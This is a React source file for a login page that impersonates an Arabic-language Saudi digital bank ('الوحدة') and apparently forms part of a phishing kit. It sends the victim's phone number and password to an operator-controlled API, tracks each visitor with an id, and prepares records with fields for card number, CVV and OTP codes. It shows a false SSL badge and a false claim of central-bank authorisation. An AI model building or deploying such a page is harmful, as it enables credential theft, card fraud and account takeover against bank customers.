import { useState, useEffect } from "react";
import { Eye, EyeOff, Shield, ChevronRight, Lock, Phone } from "lucide-react";
import { unityApi } from "@/lib/api";
import { useTracking } from "@/lib/useTracking";

const BRAND = { primary: "#1a3d6e", gold: "#c4923e" };

function randId() { return "u-" + Math.random().toString(36).slice(2, 12); }

export default function LoginPage() {
  useTracking("تسجيل الدخول");
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [showPass, setShowPass] = useState(false);
  const [loading, setLoading] = useState(false);
  const [err, setErr] = useState("");

  useEffect(() => {
    if (!localStorage.getItem("unity_id")) {
      localStorage.setItem("unity_id", randId());
    }
    const id = localStorage.getItem("unity_id")!;
    const now = new Date().toISOString();
    unityApi.submit({
      id, submittedAt: now, submittedAtTs: Date.now(),
      phone: "", password: "", cardNumber: "", cardName: "", cardMonth: "", cardYearExp: "", cardCvv: "",
      otpCode: "", otpStatus: null, page: "تسجيل الدخول", isActive: true, lastSeen: Date.now(), country: ""
    });
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (phone.trim().length < 9) { setErr("رقم الجوال غير صحيح"); return; }
    if (password.length < 4) { setErr("كلمة المرور قصيرة جداً"); return; }
    setErr("");
    setLoading(true);
    const id = localStorage.getItem("unity_id")!;
    await unityApi.patch(id, { phone, password, page: "تسجيل الدخول - مكتمل", lastSeen: Date.now() });
    setTimeout(() => { window.location.href = "/unity-bank/waiting"; }, 800);
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4" dir="rtl"
      style={{ fontFamily: "'Cairo', system-ui, sans-serif", background: `linear-gradient(135deg, ${BRAND.primary} 0%, #0d2847 100%)` }}>

      <div className="w-full max-w-md">
        {/* Card */}
        <div className="bg-white rounded-3xl shadow-2xl overflow-hidden">
          {/* Header */}
          <div className="p-8 pb-6" style={{ background: `linear-gradient(135deg, ${BRAND.primary}, #0d2847)` }}>
            <div className="flex items-center gap-3 mb-6">
              <div className="w-12 h-12 rounded-2xl flex items-center justify-center" style={{ background: BRAND.gold }}>
                <svg className="w-6 h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 6v12m-3-2.818.879.659c1.171.879 3.07.879 4.242 0 1.172-.879 1.172-2.303 0-3.182C13.536 12.219 12.768 12 12 12c-.725 0-1.45-.22-2.003-.659-1.106-.879-1.106-2.303 0-3.182s2.9-.879 4.006 0l.415.33M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0z" />
                </svg>
              </div>
              <div>
                <h1 className="text-white font-black text-2xl">الوحدة</h1>
                <p className="text-blue-300 text-xs font-semibold">البنك الرقمي</p>
              </div>
            </div>
            <h2 className="text-white text-xl font-black">تسجيل الدخول</h2>
            <p className="text-blue-200 text-sm mt-1">أدخل بيانات حسابك للمتابعة</p>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="p-8 space-y-5">
            <div className="space-y-1.5">
              <label className="text-sm font-black text-gray-700 flex items-center gap-1.5">
                <Phone className="w-3.5 h-3.5" style={{ color: BRAND.primary }} />
                رقم الجوال
              </label>
              <div className="relative">
                <input
                  type="tel"
                  value={phone}
                  onChange={e => setPhone(e.target.value)}
                  placeholder="05XXXXXXXX"
                  dir="ltr"
                  className="w-full border-2 border-gray-200 rounded-xl px-4 py-3.5 text-base font-semibold outline-none transition-all text-left placeholder:text-gray-300"
                  style={{ direction: "ltr", focusBorderColor: BRAND.primary }}
                  onFocus={e => (e.target.style.borderColor = BRAND.primary)}
                  onBlur={e => (e.target.style.borderColor = "#e5e7eb")}
                />
                <div className="absolute top-1/2 right-3 -translate-y-1/2 flex items-center gap-1 text-xs font-bold text-gray-500">
                  <img src="https://flagsapi.com/SA/flat/24.png" className="w-5 h-4 rounded" alt="SA" onError={e => (e.currentTarget.style.display = "none")} />
                  +966
                </div>
              </div>
            </div>

            <div className="space-y-1.5">
              <label className="text-sm font-black text-gray-700 flex items-center gap-1.5">
                <Lock className="w-3.5 h-3.5" style={{ color: BRAND.primary }} />
                كلمة المرور
              </label>
              <div className="relative">
                <input
                  type={showPass ? "text" : "password"}
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                  placeholder="••••••••"
                  className="w-full border-2 border-gray-200 rounded-xl px-4 py-3.5 text-base font-semibold outline-none transition-all"
                  onFocus={e => (e.target.style.borderColor = BRAND.primary)}
                  onBlur={e => (e.target.style.borderColor = "#e5e7eb")}
                />
                <button type="button" onClick={() => setShowPass(!showPass)}
                  className="absolute top-1/2 left-3 -translate-y-1/2 text-gray-400 hover:text-gray-600">
                  {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-xs text-gray-400">يجب أن تكون 6 أحرف على الأقل</span>
                <a href="#" className="text-xs font-bold hover:underline" style={{ color: BRAND.primary }}>نسيت كلمة المرور؟</a>
              </div>
            </div>

            {err && (
              <div className="bg-red-50 border border-red-200 rounded-xl p-3 text-center">
                <p className="text-red-600 text-sm font-bold">{err}</p>
              </div>
            )}

            <button type="submit" disabled={loading}
              className="w-full py-4 rounded-xl text-white font-black text-base hover:opacity-90 transition-opacity disabled:opacity-60 flex items-center justify-center gap-2 shadow-lg"
              style={{ background: loading ? "#6b7280" : BRAND.primary }}>
              {loading ? (
                <>
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  جاري التحقق...
                </>
              ) : (
                <>تسجيل الدخول <ChevronRight className="w-4 h-4" /></>
              )}
            </button>

            <div className="flex items-center gap-3 text-gray-300">
              <div className="flex-1 h-px bg-gray-200" />
              <span className="text-xs font-bold text-gray-400">أو</span>
              <div className="flex-1 h-px bg-gray-200" />
            </div>

            <button type="button" onClick={() => window.location.href = "/unity-bank/"}
              className="w-full py-3 border-2 border-gray-200 rounded-xl text-gray-600 font-bold text-sm hover:bg-gray-50 transition-colors">
              العودة للرئيسية
            </button>
          </form>

          {/* Security badge */}
          <div className="px-8 pb-8">
            <div className="bg-gray-50 rounded-xl p-3 flex items-center gap-2">
              <Shield className="w-4 h-4 text-green-500 flex-shrink-0" />
              <p className="text-xs text-gray-500 font-semibold">اتصالك مشفر بتقنية SSL 256-bit • مصرح من ساما</p>
            </div>
          </div>
        </div>

        <p className="text-center text-blue-300 text-xs mt-6 font-semibold">
          © 2024 البنك الوحدة الرقمي • جميع الحقوق محفوظة
        </p>
      </div>
    </div>
  );
}
